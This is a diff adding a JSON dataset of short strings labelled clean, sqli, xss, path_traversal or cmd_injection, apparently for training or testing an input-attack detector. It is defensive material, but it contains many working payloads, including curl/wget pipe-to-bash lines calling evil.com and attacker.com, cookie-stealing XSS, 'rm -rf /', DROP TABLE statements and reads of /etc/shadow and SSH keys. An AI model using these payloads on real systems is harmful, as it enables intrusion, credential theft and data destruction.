@@ -1,0 +1,2699 @@
+{
+  "samples": [
+    { "text": "admin", "label": "clean" },
+    { "text": "root", "label": "clean" },
+    { "text": "administrator", "label": "clean" },
+    { "text": "test", "label": "clean" },
+    { "text": "user", "label": "clean" },
+    { "text": "guest", "label": "clean" },
+    { "text": "superuser", "label": "clean" },
+    { "text": "login", "label": "clean" },
+    { "text": "username", "label": "clean" },
+    { "text": "password", "label": "clean" },
+    { "text": "admin123", "label": "clean" },
+    { "text": "root123", "label": "clean" },
+    { "text": "testuser", "label": "clean" },
+    { "text": "newuser", "label": "clean" },
+    { "text": "mypassword", "label": "clean" },
+    {
+      "text": "2024-01-15",
+      "label": "clean"
+    },
+    {
+      "text": "; curl -s http://evil.com | bash",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "| wget http://evil.com -O /tmp/shell",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Sony WH-1000XM5 Headphones",
+      "label": "clean"
+    },
+    {
+      "text": "/var/mail/root",
+      "label": "path_traversal"
+    },
+    {
+      "text": "john.doe",
+      "label": "clean"
+    },
+    {
+      "text": "<iframe src=http://evil.com></iframe>",
+      "label": "xss"
+    },
+    {
+      "text": "EXEC master..xp_cmdshell 'dir'",
+      "label": "sqli"
+    },
+    {
+      "text": "select sleep(5)",
+      "label": "sqli"
+    },
+    {
+      "text": "vbscript:msgbox(1)",
+      "label": "xss"
+    },
+    {
+      "text": "London, UK",
+      "label": "clean"
+    },
+    {
+      "text": "secret",
+      "label": "clean"
+    },
+    {
+      "text": "; hostname",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' OR 1=1/*",
+      "label": "sqli"
+    },
+    {
+      "text": "; powershell -Command Get-Process",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<div onmouseleave=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "Your account has been created successfully.",
+      "label": "clean"
+    },
+    {
+      "text": "dragon",
+      "label": "clean"
+    },
+    {
+      "text": "' ORDER BY 2--",
+      "label": "sqli"
+    },
+    {
+      "text": "1; DROP TABLE users",
+      "label": "sqli"
+    },
+    {
+      "text": "GBP",
+      "label": "clean"
+    },
+    {
+      "text": "') OR ('1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "; printenv",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../../etc/hosts",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<svg onload='alert(1)'>",
+      "label": "xss"
+    },
+    {
+      "text": "admin'/*",
+      "label": "sqli"
+    },
+    {
+      "text": "'+OR+1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "../../config.php",
+      "label": "path_traversal"
+    },
+    {
+      "text": "Meeting scheduled for 3:00 PM on Monday.",
+      "label": "clean"
+    },
+    {
+      "text": "AND 6738=6738",
+      "label": "sqli"
+    },
+    {
+      "text": "../../../etc/shadow",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/var/log/apache/access.log",
+      "label": "path_traversal"
+    },
+    {
+      "text": "&& uname -a",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "font-size: 16px;",
+      "label": "clean"
+    },
+    {
+      "text": "| powershell",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "GROUP BY 1--",
+      "label": "sqli"
+    },
+    {
+      "text": "; perl -e 'print `id`'",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<style>body{background:url(javascript:alert(1))}</style>",
+      "label": "xss"
+    },
+    {
+      "text": "[1,2,3]",
+      "label": "clean"
+    },
+    {
+      "text": "<img src=x onerror=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "%252e%252e%252f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "67890",
+      "label": "clean"
+    },
+    {
+      "text": "<a href='javascript:alert(1)'>click</a>",
+      "label": "xss"
+    },
+    {
+      "text": "' AND 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "../etc/shadow",
+      "label": "path_traversal"
+    },
+    {
+      "text": "../../.env.local",
+      "label": "path_traversal"
+    },
+    {
+      "text": "true",
+      "label": "clean"
+    },
+    {
+      "text": "document.location='http://evil.com?c='+document.cookie",
+      "label": "xss"
+    },
+    {
+      "text": "first-last",
+      "label": "clean"
+    },
+    {
+      "text": "; uname -a",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "; dir",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "v1.0.0",
+      "label": "clean"
+    },
+    {
+      "text": "<img onerror=alert(1) src=a>",
+      "label": "xss"
+    },
+    {
+      "text": "best programming languages 2024",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT username FROM admin",
+      "label": "sqli"
+    },
+    {
+      "text": "<body onload=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "; ps -ef",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Paris, France",
+      "label": "clean"
+    },
+    {
+      "text": "&& wget http://evil.com",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "/etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "onclick=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "password",
+      "label": "clean"
+    },
+    {
+      "text": "x' OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "'; SELECT SLEEP(5)--",
+      "label": "sqli"
+    },
+    {
+      "text": "' /*!50000OR*/ 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "/etc/php/php.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "how to fix car engine",
+      "label": "clean"
+    },
+    {
+      "text": "') OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "' OR ''='",
+      "label": "sqli"
+    },
+    {
+      "text": "MySecure#Pass",
+      "label": "clean"
+    },
+    {
+      "text": "<div onkeyup=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "' ORDER BY 5--",
+      "label": "sqli"
+    },
+    {
+      "text": "Qwerty123!",
+      "label": "clean"
+    },
+    {
+      "text": "how to learn javascript",
+      "label": "clean"
+    },
+    {
+      "text": "setInterval('alert(1)',1000)",
+      "label": "xss"
+    },
+    {
+      "text": "EUR",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT * FROM users",
+      "label": "sqli"
+    },
+    {
+      "text": "<select onchange=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "12345678",
+      "label": "clean"
+    },
+    {
+      "text": "..%2f..%2fetc%2fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "\n whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "&& ls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "SELECT name FROM products WHERE id = ?",
+      "label": "sqli"
+    },
+    {
+      "text": "HAVING 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "%27 UNION SELECT NULL--%27",
+      "label": "sqli"
+    },
+    {
+      "text": "<script>alert('XSS')</script>",
+      "label": "xss"
+    },
+    {
+      "text": "manager",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT version()",
+      "label": "sqli"
+    },
+    {
+      "text": "%2e%2e%2fetc%2fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "alert(document.cookie)",
+      "label": "xss"
+    },
+    {
+      "text": "| cat /etc/passwd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "$(id)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' AND '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "../../../var/log/syslog",
+      "label": "path_traversal"
+    },
+    {
+      "text": "| sh",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "2 + 2 = 4",
+      "label": "clean"
+    },
+    {
+      "text": "support",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT user()",
+      "label": "sqli"
+    },
+    {
+      "text": "document.pdf",
+      "label": "clean"
+    },
+    {
+      "text": "<svg><script>alert(1)</script></svg>",
+      "label": "xss"
+    },
+    {
+      "text": "<math onmouseover=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "..\\..\\boot.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "javascript:alert(document.cookie)",
+      "label": "xss"
+    },
+    {
+      "text": "a' or 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "../../../",
+      "label": "path_traversal"
+    },
+    {
+      "text": "; wget http://attacker.com -O /tmp/shell",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<a href=\"j&#97;vascript:alert(1)\">click</a>",
+      "label": "xss"
+    },
+    {
+      "text": "../../application.properties",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' FROM pg_tables WHERE schemaname='public'--",
+      "label": "sqli"
+    },
+    {
+      "text": "LOAD_FILE('/proc/self/environ')",
+      "label": "sqli"
+    },
+    {
+      "text": "ADMIN",
+      "label": "clean"
+    },
+    {
+      "text": "' AND 5650=5650--",
+      "label": "sqli"
+    },
+    {
+      "text": "admin' #",
+      "label": "sqli"
+    },
+    {
+      "text": "' OR 1=1#",
+      "label": "sqli"
+    },
+    {
+      "text": "/windows/system32/drivers/etc/hosts",
+      "label": "path_traversal"
+    },
+    {
+      "text": "john123",
+      "label": "clean"
+    },
+    {
+      "text": "| curl attacker.com/shell.sh",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "`id`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": ".././.././etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "beta",
+      "label": "clean"
+    },
+    {
+      "text": "; whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "order=desc",
+      "label": "clean"
+    },
+    {
+      "text": "; ruby -e 'puts `id`'",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "xp_cmdshell('dir')",
+      "label": "sqli"
+    },
+    {
+      "text": "123 Main Street",
+      "label": "clean"
+    },
+    {
+      "text": "1' UNION SELECT username,password FROM users--",
+      "label": "sqli"
+    },
+    {
+      "text": "admin'--",
+      "label": "sqli"
+    },
+    {
+      "text": "$(curl attacker.com)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "JPY",
+      "label": "clean"
+    },
+    {
+      "text": "'; INSERT INTO users VALUES('hack','hack')--",
+      "label": "sqli"
+    },
+    {
+      "text": "; ls /",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "xp_cmdshell('whoami')",
+      "label": "sqli"
+    },
+    {
+      "text": "id=1",
+      "label": "clean"
+    },
+    {
+      "text": "FROM users WHERE 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "; env",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "0",
+      "label": "clean"
+    },
+    {
+      "text": "test$(id)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "2-1 UNION SELECT",
+      "label": "sqli"
+    },
+    {
+      "text": "; ps aux",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "LOAD_FILE('/etc/passwd')",
+      "label": "sqli"
+    },
+    {
+      "text": "; ifconfig",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "total = sum + tax",
+      "label": "clean"
+    },
+    {
+      "text": "1; sleep 5",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Dear customer, your order has been shipped.",
+      "label": "clean"
+    },
+    {
+      "text": "| python3 -c 'print(open(\"/etc/passwd\").read())'",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "%3Cscript%3Ealert(1)%3C/script%3E",
+      "label": "xss"
+    },
+    {
+      "text": "<iframe src='http://evil.com'>",
+      "label": "xss"
+    },
+    {
+      "text": "python",
+      "label": "clean"
+    },
+    {
+      "text": "'||'1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "color: red;",
+      "label": "clean"
+    },
+    {
+      "text": "abc123",
+      "label": "clean"
+    },
+    {
+      "text": "; id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<<script>alert(1)//<</script>",
+      "label": "xss"
+    },
+    {
+      "text": "<a onmouseover=alert(1)>hover</a>",
+      "label": "xss"
+    },
+    {
+      "text": "/proc/self/environ",
+      "label": "path_traversal"
+    },
+    {
+      "text": "&& powershell -enc BASE64",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "pizza recipe homemade",
+      "label": "clean"
+    },
+    {
+      "text": "/api/orders",
+      "label": "clean"
+    },
+    {
+      "text": "[\"a\",\"b\",\"c\"]",
+      "label": "clean"
+    },
+    {
+      "text": "../../../../../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/var/www/.env",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' UNION ALL SELECT NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "<img src=x onerror=alert(document.cookie)>",
+      "label": "xss"
+    },
+    {
+      "text": "..%5c..%5cwindows%5csystem32",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/etc/hosts",
+      "label": "path_traversal"
+    },
+    {
+      "text": "alice",
+      "label": "clean"
+    },
+    {
+      "text": "image.jpg",
+      "label": "clean"
+    },
+    {
+      "text": "; cat /etc/shadow",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "onfocus=alert(1) autofocus",
+      "label": "xss"
+    },
+    {
+      "text": "' UNION SELECT NULL,NULL,NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "%252e%252e%252fetc%252fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "iloveyou",
+      "label": "clean"
+    },
+    {
+      "text": "../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "success",
+      "label": "clean"
+    },
+    {
+      "text": "function greet(name) { return name; }",
+      "label": "clean"
+    },
+    {
+      "text": "filter=active",
+      "label": "clean"
+    },
+    {
+      "text": "January 15, 2024",
+      "label": "clean"
+    },
+    {
+      "text": "' AND BENCHMARK(10000000,SHA1(1))--",
+      "label": "sqli"
+    },
+    {
+      "text": "'; UPDATE users SET password='hacked'--",
+      "label": "sqli"
+    },
+    {
+      "text": "/api/users",
+      "label": "clean"
+    },
+    {
+      "text": "javascript://%0aalert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "Bob Johnson",
+      "label": "clean"
+    },
+    {
+      "text": "/profile",
+      "label": "clean"
+    },
+    {
+      "text": "Page not found",
+      "label": "clean"
+    },
+    {
+      "text": "<script>window.location='http://evil.com'</script>",
+      "label": "xss"
+    },
+    {
+      "text": "name.surname",
+      "label": "clean"
+    },
+    {
+      "text": "<img src=\"jAvAsCrIpT:alert(1)\">",
+      "label": "xss"
+    },
+    {
+      "text": "SELECT id, name FROM products",
+      "label": "sqli"
+    },
+    {
+      "text": "science",
+      "label": "clean"
+    },
+    {
+      "text": "document.write('<script>alert(1)</script>')",
+      "label": "xss"
+    },
+    {
+      "text": "%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+      "label": "xss"
+    },
+    {
+      "text": "../proc/cmdline",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' UNION SELECT LOAD_FILE('/etc/passwd')--",
+      "label": "sqli"
+    },
+    {
+      "text": "audio.mp3",
+      "label": "clean"
+    },
+    {
+      "text": "user_name",
+      "label": "clean"
+    },
+    {
+      "text": "report_2024.xlsx",
+      "label": "clean"
+    },
+    {
+      "text": "javascript",
+      "label": "clean"
+    },
+    {
+      "text": "/css/style.css",
+      "label": "clean"
+    },
+    {
+      "text": "SLEEP(5)",
+      "label": "sqli"
+    },
+    {
+      "text": "../web.config",
+      "label": "path_traversal"
+    },
+    {
+      "text": "| id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "`hostname`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<img src onerror=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "monkey",
+      "label": "clean"
+    },
+    {
+      "text": "' FROM information_schema.columns--",
+      "label": "sqli"
+    },
+    {
+      "text": "....//....//etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "$(id)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "loading",
+      "label": "clean"
+    },
+    {
+      "text": "' ORDER BY 3--",
+      "label": "sqli"
+    },
+    {
+      "text": "mustang",
+      "label": "clean"
+    },
+    {
+      "text": "x') OR ('1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "<IFRAME SRC=javascript:alert(1)></IFRAME>",
+      "label": "xss"
+    },
+    {
+      "text": "id=42",
+      "label": "clean"
+    },
+    {
+      "text": "' ORDER BY 4--",
+      "label": "sqli"
+    },
+    {
+      "text": "presentation.pptx",
+      "label": "clean"
+    },
+    {
+      "text": "Jane Smith",
+      "label": "clean"
+    },
+    {
+      "text": "/home/user/.ssh/id_rsa",
+      "label": "path_traversal"
+    },
+    {
+      "text": "1 OR SLEEP(5)=0 LIMIT 1--",
+      "label": "sqli"
+    },
+    {
+      "text": "%c0%ae%c0%ae/",
+      "label": "path_traversal"
+    },
+    {
+      "text": "| printenv",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "health",
+      "label": "clean"
+    },
+    {
+      "text": "I have a question about my order #12345.",
+      "label": "clean"
+    },
+    {
+      "text": "1 && sleep 5",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "100",
+      "label": "clean"
+    },
+    {
+      "text": "error",
+      "label": "clean"
+    },
+    {
+      "text": "| powershell -ExecutionPolicy Bypass",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "/js/app.js",
+      "label": "clean"
+    },
+    {
+      "text": "sports",
+      "label": "clean"
+    },
+    {
+      "text": "$(env)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../../wp-config.php",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/settings",
+      "label": "clean"
+    },
+    {
+      "text": "Hello, I need help with my account.",
+      "label": "clean"
+    },
+    {
+      "text": "admin@company.com",
+      "label": "clean"
+    },
+    {
+      "text": "{\"key\":\"value\"}",
+      "label": "clean"
+    },
+    {
+      "text": "&& curl http://attacker.com/shell.sh | bash",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../admin/config.php",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<table background=javascript:alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "SELECT LOAD_FILE('/var/www/.env')",
+      "label": "sqli"
+    },
+    {
+      "text": "print('Hello')",
+      "label": "clean"
+    },
+    {
+      "text": "sunshine",
+      "label": "clean"
+    },
+    {
+      "text": "DELETE FROM users",
+      "label": "sqli"
+    },
+    {
+      "text": "{}",
+      "label": "clean"
+    },
+    {
+      "text": "window.location='http://evil.com'",
+      "label": "xss"
+    },
+    {
+      "text": "' or '' '",
+      "label": "sqli"
+    },
+    {
+      "text": "' ORDER BY 10--",
+      "label": "sqli"
+    },
+    {
+      "text": "../../etc/shadow",
+      "label": "path_traversal"
+    },
+    {
+      "text": "..\\..\\windows\\win.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "%2e%2e%2f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "| uname -a",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "sp_password",
+      "label": "sqli"
+    },
+    {
+      "text": "../../../WEB-INF/web.xml",
+      "label": "path_traversal"
+    },
+    {
+      "text": "master",
+      "label": "clean"
+    },
+    {
+      "text": "| ping -n 1 127.0.0.1",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "0x27 OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "expression(alert(1))",
+      "label": "xss"
+    },
+    {
+      "text": "<link rel=stylesheet href=javascript:alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "info",
+      "label": "clean"
+    },
+    {
+      "text": "python tutorial for beginners",
+      "label": "clean"
+    },
+    {
+      "text": "%7c%20id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "order-12345",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT * FROM users WHERE id = 1",
+      "label": "sqli"
+    },
+    {
+      "text": "user123",
+      "label": "clean"
+    },
+    {
+      "text": "..\\boot.ini",
+      "label": "path_traversal"
+    },
+    {
+      "text": "1+1 OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "../config/database.php",
+      "label": "path_traversal"
+    },
+    {
+      "text": "SELECT 1",
+      "label": "sqli"
+    },
+    {
+      "text": "window.open('http://evil.com')",
+      "label": "xss"
+    },
+    {
+      "text": "OK",
+      "label": "clean"
+    },
+    {
+      "text": "&& ls -la",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "supervisor",
+      "label": "clean"
+    },
+    {
+      "text": ") OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "; ls; whoami; id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "| ls -la",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "; cat /var/www/html/.env",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "$(uname -a)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../proc/self/environ",
+      "label": "path_traversal"
+    },
+    {
+      "text": "select load_file('/etc/passwd')",
+      "label": "sqli"
+    },
+    {
+      "text": "/images/photo.jpg",
+      "label": "clean"
+    },
+    {
+      "text": "Apple MacBook Pro 14 inch M3",
+      "label": "clean"
+    },
+    {
+      "text": "USD",
+      "label": "clean"
+    },
+    {
+      "text": "Samsung Galaxy S24 Ultra - 256GB",
+      "label": "clean"
+    },
+    {
+      "text": "user123!",
+      "label": "clean"
+    },
+    {
+      "text": "INSERT INTO admin VALUES",
+      "label": "sqli"
+    },
+    {
+      "text": "../../var/log/auth.log",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/api/products",
+      "label": "clean"
+    },
+    {
+      "text": "SELECT 1,2,3",
+      "label": "sqli"
+    },
+    {
+      "text": "onfocus=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "football",
+      "label": "clean"
+    },
+    {
+      "text": "onload=alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "null",
+      "label": "clean"
+    },
+    {
+      "text": "..%5cetc%2fpasswd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "Admin",
+      "label": "clean"
+    },
+    {
+      "text": "; ls",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "top 10 movies 2024",
+      "label": "clean"
+    },
+    {
+      "text": "Thank you for your support!",
+      "label": "clean"
+    },
+    {
+      "text": "../../etc/hostname",
+      "label": "path_traversal"
+    },
+    {
+      "text": "CHAR(39)",
+      "label": "sqli"
+    },
+    {
+      "text": "hello",
+      "label": "clean"
+    },
+    {
+      "text": "1 OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "Tokyo, Japan",
+      "label": "clean"
+    },
+    {
+      "text": "; ping -c 1 127.0.0.1",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "&& rm -rf /",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "limit=20",
+      "label": "clean"
+    },
+    {
+      "text": "page=1",
+      "label": "clean"
+    },
+    {
+      "text": "stock market news today",
+      "label": "clean"
+    },
+    {
+      "text": "../../var/log/nginx/access.log",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/dashboard",
+      "label": "clean"
+    },
+    {
+      "text": "%27 OR %271%27%3D%271",
+      "label": "sqli"
+    },
+    {
+      "text": "/etc/hostname",
+      "label": "path_traversal"
+    },
+    {
+      "text": "`ls`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../../../config/settings.py",
+      "label": "path_traversal"
+    },
+    {
+      "text": "../../etc/passwd",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<audio onerror=alert(1)><source></audio>",
+      "label": "xss"
+    },
+    {
+      "text": "test`id`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "price * quantity",
+      "label": "clean"
+    },
+    {
+      "text": "$(whoami)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../etc/hostname",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<svg onload=alert(1)/>",
+      "label": "xss"
+    },
+    {
+      "text": "| env",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "/proc/net/tcp",
+      "label": "path_traversal"
+    },
+    {
+      "text": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+      "label": "sqli"
+    },
+    {
+      "text": "%2e%2e%2f",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/etc/mysql/my.cnf",
+      "label": "path_traversal"
+    },
+    {
+      "text": "'; WAITFOR DELAY '0:0:5'--",
+      "label": "sqli"
+    },
+    {
+      "text": "$(ls)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "{\"name\":\"John\",\"age\":30}",
+      "label": "clean"
+    },
+    {
+      "text": "<svg onload=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "label": "xss"
+    },
+    {
+      "text": "javascript:alert(1)",
+      "label": "xss"
+    },
+    {
+      "text": "Nike Air Max 270 Size 10",
+      "label": "clean"
+    },
+    {
+      "text": "1 UNION SELECT user(),version()--",
+      "label": "sqli"
+    },
+    {
+      "text": "/etc/group",
+      "label": "path_traversal"
+    },
+    {
+      "text": "/root/.bash_history",
+      "label": "path_traversal"
+    },
+    {
+      "text": "&& dir",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "`id`",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "<img src='x' onerror='alert(1)'>",
+      "label": "xss"
+    },
+    {
+      "text": "<input onfocus=alert(1) autofocus>",
+      "label": "xss"
+    },
+    {
+      "text": "' OR 1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "| cmd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' UNION SELECT NULL--",
+      "label": "sqli"
+    },
+    {
+      "text": "SELECT NULL",
+      "label": "sqli"
+    },
+    {
+      "text": "' /**/OR/**/1=1--",
+      "label": "sqli"
+    },
+    {
+      "text": "SELECT * FROM information_schema.tables",
+      "label": "sqli"
+    },
+    {
+      "text": "| id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "1; EXEC sp_executesql N'SELECT @@version'",
+      "label": "sqli"
+    },
+    {
+      "text": "profile_picture.jpeg",
+      "label": "clean"
+    },
+    {
+      "text": "<div onmouseover=alert(1)>hover</div>",
+      "label": "xss"
+    },
+    {
+      "text": "' AND 1=2--",
+      "label": "sqli"
+    },
+    {
+      "text": "../../includes/config.inc",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<script src=http://evil.com/xss.js></script>",
+      "label": "xss"
+    },
+    {
+      "text": "'; EXECUTE immediate 'DROP TABLE users'--",
+      "label": "sqli"
+    },
+    {
+      "text": "12345",
+      "label": "clean"
+    },
+    {
+      "text": "; cat /etc/passwd;echo hacked",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "DROP DATABASE testdb",
+      "label": "sqli"
+    },
+    {
+      "text": "../etc/hosts",
+      "label": "path_traversal"
+    },
+    {
+      "text": "sort=asc",
+      "label": "clean"
+    },
+    {
+      "text": "| sleep 5",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "Logout successful.",
+      "label": "clean"
+    },
+    {
+      "text": "' AND ascii(substr(username,1,1))=97--",
+      "label": "sqli"
+    },
+    {
+      "text": "<div oncontextmenu=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "'' OR 1=1",
+      "label": "sqli"
+    },
+    {
+      "text": "CHAR(39)+CHAR(79)+CHAR(82)",
+      "label": "sqli"
+    },
+    {
+      "text": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+      "label": "sqli"
+    },
+    {
+      "text": "$(cat /etc/passwd)",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "; cat /etc/passwd",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "operator",
+      "label": "clean"
+    },
+    {
+      "text": "& whoami",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "' or ''-'",
+      "label": "sqli"
+    },
+    {
+      "text": "Please find attached your invoice.",
+      "label": "clean"
+    },
+    {
+      "text": "42",
+      "label": "clean"
+    },
+    {
+      "text": "<svg><set attributeName=onmouseover value=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "March 2024",
+      "label": "clean"
+    },
+    {
+      "text": "' UNION SELECT 1,2,3--",
+      "label": "sqli"
+    },
+    {
+      "text": "& dir",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "1; SLEEP(5)",
+      "label": "sqli"
+    },
+    {
+      "text": "/blog/post/123",
+      "label": "clean"
+    },
+    {
+      "text": "weather today in new york",
+      "label": "clean"
+    },
+    {
+      "text": "; dir /s",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "user@example.com",
+      "label": "clean"
+    },
+    {
+      "text": "Internal server error",
+      "label": "clean"
+    },
+    {
+      "text": "&& id",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "'; EXEC xp_cmdshell('id')--",
+      "label": "sqli"
+    },
+    {
+      "text": "' OR SLEEP(5)--",
+      "label": "sqli"
+    },
+    {
+      "text": "| cat /etc/passwd | grep root",
+      "label": "cmd_injection"
+    },
+    {
+      "text": "../.env",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
+      "label": "xss"
+    },
+    {
+      "text": "2024-12-31",
+      "label": "clean"
+    },
+    {
+      "text": "user2",
+      "label": "clean"
+    },
+    {
+      "text": "DELETE FROM users WHERE id>0",
+      "label": "sqli"
+    },
+    {
+      "text": "admin'; DELETE FROM users WHERE '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "../var/www/html/config.php",
+      "label": "path_traversal"
+    },
+    {
+      "text": "<div onmouseenter=alert(1)>",
+      "label": "xss"
+    },
+    {
+      "text": "princess",
+      "label": "clean"
+    },
+    {
+      "text": "1' OR '1'='1",
+      "label": "sqli"
+    },
+    {
+      "text": "john",
+      "label": "clean"
+    },
+    {
+      "text": "admin'--",
+      "label": "sqli"
+    },
+    {
+      "text": "/proc/net/udp",
+      "label": "path_traversal"
+    },
+    {
+      "text": "Please call us at 1-800-555-0100 during business hours.",
+      "label": "clean"
+    },
+    {
+      "text": "<div onmousedown=alert(1)>",
+      "label": "xss"
